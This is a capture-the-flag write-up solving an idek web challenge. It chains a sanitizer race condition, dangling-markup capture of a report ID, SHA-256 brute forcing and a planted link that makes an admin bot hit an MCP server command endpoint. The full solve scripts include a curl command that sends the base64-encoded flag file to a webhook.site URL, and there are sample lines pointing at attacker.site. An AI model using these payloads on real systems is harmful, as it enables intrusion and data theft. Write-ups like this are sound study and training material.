<pre class="named-fence-block"><code class="language-javascript">app.get('/', async (req, res) =&gt; {
  const session_id = req.query.session_id;
  const user_id = req.query.user_id;

  console.log(`session_id = "${session_id}"`);
  console.log(`user_id = "${user_id}"`);

  if (!session_id || !user_id) {
    return res.status(400).json({ error: 'session_id and user_id are required' });
  }

  const report_id = crypto
    .createHash('sha256')
    .update(`${session_id}:${user_id}:${REPORT_KEY}`)
    .digest('hex')
    .slice(0, 7);
  const url = `http://main:1337/sessions/${session_id}?user_id=${user_id}&amp;report_id=${report_id}`;

  await visit(url, report_id);

  res.json({ message: 'Bot visited the URL' });
});
</code><div class="named-fence-filename">bot/bot.js</div></pre>
<p>In the visit function, we see a second hurdle:</p>
<pre class="named-fence-block"><code class="language-javascript">const visit = async (url, report_id) =&gt; {
    // ... setting up the browser and signing in ...
    // ... navigating to the url ...

    await page.evaluate(() =&gt; {
      document.querySelectorAll('meta[http-equiv]').forEach((el) =&gt; {
        if (el.getAttribute('http-equiv').toLowerCase() === 'refresh') {
          el.remove();
        }
      });
      window.stop();
    });

    await page.waitForTimeout(2000);

    await page.evaluate((report_id) =&gt; {
      document.querySelector(`#checkReportBtn-${report_id}`).click();
    }, report_id);

    // ... logging out and tearing down ...
}
</code><div class="named-fence-filename">bot/bot.js</div></pre>
<p>The first part thwarts a well-known technique of using meta tags to navigate to another page: <code>&lt;meta http-equiv="refresh" content="0;url=http://attacker.site" /&gt;</code>. The second part looks more useful, and could be a clickjacking sink (it is in fact used later on).</p>
<p>Based on the sanitization checks in <code>create_message</code>, I assumed that our XSS source would be in the message content. To verify this, I restarted the container with sanitization disabled and verified that I was able to use that to inject arbitrary elements into the DOM.</p>
<blockquote>
<p>The content is dynamically loaded on the client side using innerHTML. You can read the code in <code>web/templates/session.html</code> to see exactly where this happens, but it's not very interesting so I'm leaving it out.</p>
</blockquote>
<h1 id="overcoming-sanitizer" tabindex="-1">Overcoming Sanitizer</h1>
<p>Let's have a look at the first obstacle: <code>Sanitizer</code></p>
<pre class="named-fence-block"><code class="language-python">import time
import bleach
import hashlib

sanitize_store = {}

class Sanitizer:
    def __init__(self, content: str):
        self.content = content

    def generate_key(self, session_id, user_id):
        global sanitize_store
        nonce = self.content[:128]
        timestamp = int(time.time())
        key = f"{session_id}:{user_id}:{nonce}:{timestamp}"
        hash = hashlib.sha256(key.encode()).hexdigest()

        return hash
    
    def check(self, session_id, user_id):
        global sanitize_store
        
        hash = self.generate_key(session_id, user_id)
        
        if hash in sanitize_store:
            return sanitize_store[hash]
    
        bad_chars = ['&lt;', '&gt;', '=', '!', '@', '#', '$', '%', '^', '&amp;', '*', '(', ')', '[', ']', '{', '}', '|', '\\', '/', '?', ':', ';', '.', ',', '\'', '\"', '`', '~']

        for char in bad_chars:
            if char in self.content:
                sanitize_store[hash] = True
                return True
        
        sanitize_store[hash] = False
        return False
    
    def sanitize(self):
        allowed_tags = ['p', 'strong', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'code']
        allowed_attrs = {
            '*': ['class']
        }

        return bleach.clean(self.content, tags=allowed_tags, attributes=allowed_attrs)
</code><div class="named-fence-filename">web/sessions/sanitizer.py</div></pre>
<p>Recall that sanitizer is used as follows:</p>
<pre><code class="language-python">sanitizer = Sanitizer(content)

if sanitizer.check(session_id, user_id):
    content = sanitizer.sanitize()
</code></pre>
<p>From a first glance, <code>bad_chars</code> is an extremely strict blacklist and seemingly impossible to bypass. We could try to find a vulnerability in <code>bleach.clean</code>, however there is the glaringly suspicious <code>satinize_store</code>, which acts as a cache of sorts for <code>sanitizer.check</code> results.</p>
<p>Looking at <code>generate_key</code>, we can see that cache keys only check the first 128 characters of the payload, and the current time in seconds. Thus, if we first send a message with 128 characters that passes the check, it will be recorded as "clean". If we then send another message in the same second, with the same first 128 characters, we can append our XSS payload to the back, and it will still pass the sanitizer check due to the key collision.</p>
<p>I wrote a python script for this:</p>
<pre class="named-fence-block"><code class="language-python">import requests
import random
import time
from threading import Thread

url = 'http://127.0.0.1:1337'

sess = requests.Session()

# sess.post(url + '/auth/register', json={'username': 'a', 'password': 'a'})
sess.post(url + '/auth/login', json={'username': 'a', 'password': 'a'})

resp = sess.post(url + '/tokens', json={'token': random.randbytes(10).hex()})
print(resp.text)

resp = sess.post(url + '/sessions/')
print(resp.text)
sid = resp.json()['session_id']

# race condition to bypass sanitizer

payload = '&lt;script&gt;alert(1)&lt;/script&gt;'

def send_message(sess: requests.Session, sid: str, content: str):
    resp = sess.post(url + f'/sessions/{sid}/messages', json={'content': content})
    print(resp.text)

a = Thread(target=send_message, args=(sess, sid, 'A' * 128))
b = Thread(target=send_message, args=(sess, sid, 'A' * 128 + payload))

a.start()
time.sleep(0.1)
b.start()

a.join()
b.join()
</code><div class="named-fence-filename">s.py</div></pre>
<p>Running this and inspecting the resulting session in the browser, I confirmed the script tag was successfully inserted into the DOM. However, it doesn't run due to CSP.</p>
<h1 id="csp-%26-clickjacking" tabindex="-1">CSP &amp; clickjacking</h1>
<p>The app has a rather strict CSP:</p>
<pre class="named-fence-block"><code class="language-python">@app.after_request
def add_security_headers(response):
    nonce = getattr(g, 'csp_nonce', '')
    csp_policy = (
        "default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}' https://cdn.tailwindcss.com; "
        "style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com; "
        "font-src 'self' https://cdnjs.cloudflare.com; "
        "img-src 'self'; "
        "connect-src 'self'; "
        "media-src 'self'; "
        "worker-src 'self'; "
        "child-src 'none'; "
        "frame-src 'none'; "
        "object-src 'none'; "
        "base-uri 'self'; "
        "form-action 'self'; "
        "frame-ancestors 'none'; "
    )

    response.headers['Content-Security-Policy'] = csp_policy
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    return response
</code><div class="named-fence-filename">web/app.py</div></pre>
<p>Almost all standard techniques are blocked - iframes, object tags, embed tags, base tags. However, <code>style-src 'unsafe-inline'</code> looked interesting.</p>
<p>Remembering that the bot does a single click (<code>document.querySelector(``#checkReportBtn-${report_id}``).click();</code>), I realised if we inject a link with the same element id, the bot would click our link instead (since it appears before the real button in the DOM), redirecting to wherever we desire. The problem is that <code>report_id</code> is unknown, generated as follows (<code>REPORT_KEY</code> is an unknown environment variable):</p>
<pre><code class="language-javascript">  const report_id = crypto
    .createHash('sha256')
    .update(`${session_id}:${user_id}:${REPORT_KEY}`)
    .digest('hex')
    .slice(0, 7);
</code></pre>
<p>But notice that <code>report_id</code> stays consistent for the same session. If we are able to somehow leak the value, we can create a new report in the same session, with the correct element id and thus redirect the bot.</p>
<p>I experimented with ideas to do <a href="https://portswigger.net/research/blind-css-exfiltration">blind CSS exfiltration</a>. <code>default-src 'self'</code> blocks almost all cross-origin network connections without javascript, but it doesn't block DNS prefetching. With this in mind I tried exfiltrating with <code>&lt;link rel="dns-prefetch" href="http://attacker.site"&gt;</code> and <a href="https://github.com/projectdiscovery/interactsh">interactsh</a>, but it didn't work because DNS prefetching is done immediately after the tag is parsed, way before any styles are applied.</p>
<p>I also scoured the app's API routes for possible exfiltration points, but none of them worked.</p>
<h1 id="admin-routes" tabindex="-1">Admin routes</h1>
<p>Finally, I took a look into <code>session.html</code>. It's a big file at 960 lines, and I was hoping there would be something useful inside.</p>
<pre><code class="language-html">&lt;script nonce="{{ g.csp_nonce }}"&gt;
    // ... initialising variables ...

    document.addEventListener('DOMContentLoaded', async function() {
        await checkAuth();
        loadInitialData(); // insert message content into the DOM
        setupEventListeners();
        setupLazyLoading();
        
        if (INITIAL_USER_DATA &amp;&amp; INITIAL_USER_DATA.is_admin) {
            await saveReportLog();
        }
    });
</code></pre>
<p>Starting from the main script initialization, I looked through all the functions. Most of them were unremarkable, but <code>saveReportLog</code> was different.</p>
<pre><code class="language-javascript">async function saveReportLog() {
    const allMessages = messagesContainer.querySelectorAll('.message.user, .message-pair');
    let userMessage = null;
    
    for (let i = allMessages.length - 1; i &gt;= 0; i--) {
        const messageElement = allMessages[i];
        
        if (messageElement.classList.contains('user')) {
            const proseContent = messageElement.querySelector('.prose');
            if (proseContent) {
                userMessage = proseContent.innerHTML.trim();
                break;
            }
        }
        
        if (messageElement.classList.contains('message-pair')) {
            const userDiv = messageElement.querySelector('.justify-end .prose');
            if (userDiv) {
                userMessage = userDiv.innerHTML.trim();
                break;
            }
        }
    }

    if (!userMessage) {
        console.warn('No user message found to save report log');
        return;
    }

    userMessage = userMessage
        .replace(/\n/g, '')
        .replace(/\r/g, '')
        .replace(/\t/g, '')
        .replace(/&lt;/g, '&amp;lt;')
        .replace(/&gt;/g, '&amp;gt;');

    try {
        const response = await fetch(`/admin/sessions/${currentSessionId}/report`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            credentials: 'same-origin',
            body: JSON.stringify({
                report_message: userMessage,
                reporter_id: INITIAL_USER_DATA.user_id
            })
        });
        
        if (response.ok) {
            console.log('Report log saved');
        } else {
            console.warn('Report log save failed:', response.status);
        }
    } catch (error) {
        console.error('Admin check error:', error);
    }
}
</code></pre>
<p>Essentially, it selects an element based on its classes, and posts the contents to <code>/admin/sessions/${currentSessionId}/report</code>.</p>
<p>Until now, the <code>/admins</code> routes of the app have never been used. It has only two endpoints, one to post reports, and one to get reports. Conveniently, the GET endpoint does not require admin!</p>
<pre class="named-fence-block"><code class="language-python">@admin_bp.route('/sessions/&lt;session_id&gt;/report', methods=['GET'])
@login_required
def get_report_log(session_id):
    user_id = flask_session['user_id']
    is_admin = flask_session['is_admin']

    db = get_db()
    report_logs = db.execute('SELECT * FROM report_logs WHERE session_id = ?', (session_id,)).fetchall()

    if not report_logs:
        return jsonify({'error': 'No report logs found'}), 404

    report_logs_json = []

    for report_log in report_logs:
        if report_log['user_id'] == user_id or is_admin:
            report_logs_json.append({
                'id': report_log['id'],
                'user_id': report_log['user_id'],
                'session_id': report_log['session_id'],
                'message_id': report_log['message_id'],
                'report_message': report_log['report_message'] if is_admin else "Cannot view report message"
            })

    return jsonify({'report_logs': report_logs_json}), 200

@admin_bp.route('/sessions/&lt;session_id&gt;/report', methods=['POST'])
@login_required
def save_report_log(session_id):
    user_id = flask_session['user_id']
    is_admin = flask_session['is_admin']

    if not is_admin:
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json()

    report_message = data.get('report_message')
    reporter_id = data.get('reporter_id')

    if not report_message or not reporter_id:
        return jsonify({'error': 'report_message and reporter_id are required'}), 400

    report_message = report_message.replace('\n', '').replace('\r', '').replace('\t', '').replace('&lt;', '&amp;lt;').replace('&gt;', '&amp;gt;')
    message_id = hashlib.sha256(report_message.encode()).hexdigest()

    db = get_db()
    existing_report = db.execute('SELECT id FROM report_logs WHERE report_message = ? AND user_id = ?', (message_id, reporter_id)).fetchone()

    if existing_report:
        return jsonify({'error': 'Report already exists'}), 400
    
    db.execute('INSERT INTO report_logs (id, user_id, admin_id, session_id, message_id, report_message) VALUES (?, ?, ?, ?, ?, ?)', (str(uuid.uuid4()), reporter_id, user_id, session_id, message_id, report_message))
    db.commit()

    return jsonify({'message': 'Report saved'}), 200
</code><div class="named-fence-filename">web/admins/routes.py</div></pre>
<p>If we could somehow include our <code>report_id</code> inside the admin report, then perhaps it could be exfiltrated. But how do we encapsulate the report button in an element we control?</p>
<h1 id="exfiltrating-report_id" tabindex="-1">Exfiltrating report_id</h1>
<p>A <code>&lt;style&gt;</code> tag achieves exactly that. When the html parser encounters a <code>&lt;style&gt;</code> tag, it consumes all characters until it encounters the closing tag <code>&lt;/style&gt;</code>. Thus, all other closing tags are ignored and it is able to gobble up large parts of the DOM. I thereby came up with the payload:</p>
<pre><code class="language-html">&lt;div class="message user"&gt;&lt;div class="prose"&gt;&lt;style&gt;
</code></pre>
<p>The dangling markup is automatically closed by the <code>innerHTML</code> setter, at the end of <code>.message-pair</code>.</p>
<pre class="named-fence-block"><code class="language-javascript">function createMessagePairElement(pair) {
    const pairElement = document.createElement('div');
    pairElement.className = 'message-pair space-y-4';
    
    let pairHTML = '';
    
    if (pair.user) {
        // our injection point
        pairHTML += createSingleMessageHTML(pair.user.role, pair.user.content);
    }
    
    if (pair.assistant) {
        // this part contains report_id
        pairHTML += createSingleMessageHTML(pair.assistant.role, pair.assistant.content);
    }
    
    pairElement.innerHTML = pairHTML;
    return pairElement;
}
</code><div class="named-fence-filename">web/templates/session.html</div></pre>
<p>The resulting DOM looks like this (signed in as a user):</p>
<pre><code class="language-html">&lt;div class="message user"&gt;&lt;div class="prose"&gt;&lt;style&gt;
                                &lt;/div&gt;
                            &lt;/div&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            
                &lt;div class="flex justify-start"&gt;
                    &lt;div class="flex max-w-[80%] flex-row items-start space-x-3"&gt;
                        &lt;div class="w-8 h-8 rounded-full flex items-center justify-center bg-claude-orange mr-3"&gt;
                            &lt;i class="fas fa-robot text-white text-sm"&gt;&lt;/i&gt;
                        &lt;/div&gt;
                        &lt;div class="flex-1"&gt;
                            &lt;div class="bg-white border border-gray-200 rounded-2xl rounded-tl-md px-4 py-3"&gt;
                                &lt;div class="prose prose-sm max-w-none text-gray-800"&gt;
                                    &lt;div class="text-red-500"&gt;
                                            &lt;p&gt;
                                                &lt;strong&gt;An error occurred.&lt;/strong&gt;
                                                &lt;br&gt;
                                                Claude API Error: HTTP 401 - invalid x-api-key
                                            &lt;/p&gt;
                                            &lt;br&gt;
                                            
                                            &lt;button id="reportBtn" class="bg-red-500 text-white px-4 py-2 rounded-md"&gt;
                                                Report Session
                                            &lt;/button&gt;
                                            
                                            &lt;br&gt;&lt;br&gt;
                                            &lt;p class="text-sm"&gt;
                                                &lt;strong&gt;'You cannot send new messages until you report.'&lt;/strong&gt;
                                            &lt;/p&gt;
                                            &lt;/div&gt;
                                &lt;/div&gt;
                            &lt;/div&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/style&gt;&lt;/div&gt;&lt;/div&gt;
</code></pre>
<p>I reported this session and checked <code>/admin/sessions/{session_id}/report</code>:</p>
<pre><code class="language-json">{
    "report_logs": [
        {
            "id": "ee461e60-9b19-4f84-907e-55a9721d5915",
            "message_id": "fb9bd397cf361cb6ae9a79f60682980e0feb426cc7fdc5ce9366528cec8db942",
            "report_message": "Cannot view report message",
            "session_id": "23d902f7-b3ac-41e4-b3d4-63088b7b535b",
            "user_id": "654a6a03-6764-4e77-8f28-2921ac275bb6"
        }
    ]
}
</code></pre>
<p>Here's one last hurdle: the report content is censored from non-admins. But take another look at how <code>message_id</code> is generated during admin report creation:</p>
<pre class="named-fence-block"><code class="language-python">
@admin_bp.route('/sessions/&lt;session_id&gt;/report', methods=['POST'])
@login_required
def save_report_log(session_id):
    ...
    message_id = hashlib.sha256(report_message.encode()).hexdigest()
    ...
</code><div class="named-fence-filename">web/admins/routes.py</div></pre>
<p><code>message_id</code> is the sha256 digest of the message contents. Since <code>report_id</code> is the only part that changes in the message, we can brute force those 3.5 bytes until we find the matching hash. I wrote a python script to do this (takes around 12 minutes to run in the worst case):</p>
<pre class="named-fence-block"><code class="language-python">import hashlib

for i in range(16 ** 7):
    rid = hex(i)[2:].rjust(7, '0')
    s = f"&amp;lt;style&amp;gt;                                &amp;lt;/div&amp;gt;                            &amp;lt;/div&amp;gt;                        &amp;lt;/div&amp;gt;                    &amp;lt;/div&amp;gt;                &amp;lt;/div&amp;gt;                            &amp;lt;div class=\"flex justify-start\"&amp;gt;                    &amp;lt;div class=\"flex max-w-[80%] flex-row items-start space-x-3\"&amp;gt;                        &amp;lt;div class=\"w-8 h-8 rounded-full flex items-center justify-center bg-claude-orange mr-3\"&amp;gt;                            &amp;lt;i class=\"fas fa-robot text-white text-sm\"&amp;gt;&amp;lt;/i&amp;gt;                        &amp;lt;/div&amp;gt;                        &amp;lt;div class=\"flex-1\"&amp;gt;                            &amp;lt;div class=\"bg-white border border-gray-200 rounded-2xl rounded-tl-md px-4 py-3\"&amp;gt;                                &amp;lt;div class=\"prose prose-sm max-w-none text-gray-800\"&amp;gt;                                    &amp;lt;div class=\"text-red-500\"&amp;gt;                                            &amp;lt;p&amp;gt;                                                &amp;lt;strong&amp;gt;An error occurred.&amp;lt;/strong&amp;gt;                                                &amp;lt;br&amp;gt;                                                Claude API Error: HTTP 401 - invalid x-api-key                                            &amp;lt;/p&amp;gt;                                            &amp;lt;br&amp;gt;                                                                                        &amp;lt;button id=\"checkReportBtn-{rid}\" class=\"bg-red-500 text-white px-4 py-2 rounded-md\"&amp;gt;                                                Check Report {rid}                                            &amp;lt;/button&amp;gt;                                            &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;                                            &amp;lt;p class=\"text-sm\"&amp;gt;                                                &amp;lt;strong&amp;gt;'You cannot send new messages until you report.'&amp;lt;/strong&amp;gt;                                            &amp;lt;/p&amp;gt;                                            &amp;lt;/div&amp;gt;                                &amp;lt;/div&amp;gt;                            &amp;lt;/div&amp;gt;                        &amp;lt;/div&amp;gt;                    &amp;lt;/div&amp;gt;                &amp;lt;/div&amp;gt;            &amp;lt;/style&amp;gt;"
    if i % 1_000_000 == 0:
        print(i, round(i * 100 / (16 ** 7), 2))
    if hashlib.sha256(s.encode()).hexdigest() == 'fb9bd397cf361cb6ae9a79f60682980e0feb426cc7fdc5ce9366528cec8db942':
        print(rid)
        break
</code><div class="named-fence-filename">b.py</div></pre>
<pre class="named-fence-block"><code class="language-plaintext">...
34b3da7
</code><div class="named-fence-filename">output</div></pre>
<p>With that, we've managed to leak report_id. Create a second message in the same session with a link to the RCE endpoint, with the desired command:</p>
<pre><code class="language-html">&lt;a id="checkReportBtn-34b3da7" href="http://mcp-server:6277/sse?transportType=stdio&amp;command=sh&amp;args=-c%20%22curl%20https%3A//webhook.site/2c7d64f3-cd0a-42a5-8b32-b95e3f6b19aa%3Ff%3D%60cat%20/app/flag.txt%20%7C%20base64%20-w%200%60%22" /&gt;
</code></pre>
<p>Thereafter, I got the flag locally.</p>
<h1 id="solve-script" tabindex="-1">Solve script</h1>
<p>On remote, threading+requests wasn't winning the race condition to bypass <code>Sanitizer</code> (I don't know why) but I got it working with <code>grequests</code>. Since it only worked half the time, I split my solve into two scripts. After running the first script I would manually check if the payload was successfully inserted, and once it worked I send the report. Then I copied the <code>message_id</code> and ran my hash cracker (I should probably have preemptively generated a mapping of all possible hashes beforehand, since I had to retry my exploit multiple times and this part took quite long to run). Once I got the correct <code>report_id</code>, I copied it over to the second script which inserts the malicious link.</p>
<pre class="named-fence-block"><code class="language-python">import grequests
import requests
import time
import random

url = 'http://127.0.0.1:1337'
url = 'https://ctfinder-3d264a71099b40be.instancer.idek.team'
username = 'a'

sess = requests.Session()

sess.post(url + '/auth/register', json={'username': username, 'password': 'a'})
sess.post(url + '/auth/login', json={'username': username, 'password': 'a'})

resp = sess.post(url + '/tokens', json={'token': random.randbytes(10).hex()})
print(resp.text)

resp = sess.post(url + '/sessions/')
print(resp.text)
sid = resp.json()['session_id']

# race condition to bypass sanitizer

# exfiltrate report id with css
payload = '&lt;div class="message user"&gt;&lt;div class="prose"&gt;&lt;style&gt;'

auth_sess = sess.cookies.get('session')
reqs = []
reqs.append(grequests.post(url + f'/sessions/{sid}/messages', json={'content': 'A' * 128}, headers={'Cookie': 'session=' + auth_sess}))
reqs.append(grequests.post(url + f'/sessions/{sid}/messages', json={'content': 'A' * 128 + payload}, headers={'Cookie': 'session=' + auth_sess}))

resps = grequests.map(reqs)
for resp in resps:
    print(resp.text)

print(sid)
</code><div class="named-fence-filename">s0.py</div></pre>
<pre class="named-fence-block"><code class="language-python">import grequests
import requests
from urllib.parse import quote

url = 'http://127.0.0.1:1337'
url = 'https://ctfinder-3d264a71099b40be.instancer.idek.team'
username = 'z'
sid = 'edc5a1e1-9463-4444-a138-a53c98cba650'
report_id = 'fe0a001'

sess = requests.Session()

sess.post(url + '/auth/login', json={'username': username, 'password': 'a'})

args = '-c "curl https://webhook.site/2c7d64f3-cd0a-42a5-8b32-b95e3f6b19aa?f=`cat /app/flag.txt | base64 -w 0`"'
args = quote(args)
print(args)

payload = f'&lt;a id="checkReportBtn-{report_id}" href="http://0.0.0.0:6277/sse?transportType=stdio&amp;command=sh&amp;args={args}" /&gt;'

auth_sess = sess.cookies.get('session')
reqs = []
reqs.append(grequests.post(url + f'/sessions/{sid}/messages', json={'content': 'A' * 128}, headers={'Cookie': 'session=' + auth_sess}))
reqs.append(grequests.post(url + f'/sessions/{sid}/messages', json={'content': 'A' * 128 + payload}, headers={'Cookie': 'session=' + auth_sess}))

resps = grequests.map(reqs)
for resp in resps:
    print(resp.text)

print(sid)
</code><div class="named-fence-filename">s1.py</div></pre>
<p>A few seconds after reporting the second message, I got the webhook notification and decoded the flag:</p>
<p><code>idek{78a750a47c1a4350a0f528b63293dc05f3c9afcee09bbb0f85b5b2d13b537b95}</code></p>
<h1 id="closing-thoughts" tabindex="-1">Closing thoughts</h1>
<p>I was quite happy with this solve. This challenge consisted of many smaller parts which in isolation aren't that hard, but with a  large codebase its easy to get lost or stuck down a rabbit hole. I found it helpful to follow the signposts (e.g. button click in the bot, existence of admin routes) whenever I was stumped.</p>
</div><div class="fixed w-[17.5rem] h-full top-0 right-0 pointer-events-none pr-8 max-lg:hidden"><!----></div></div><!----></div></div>
    
  

</body></html>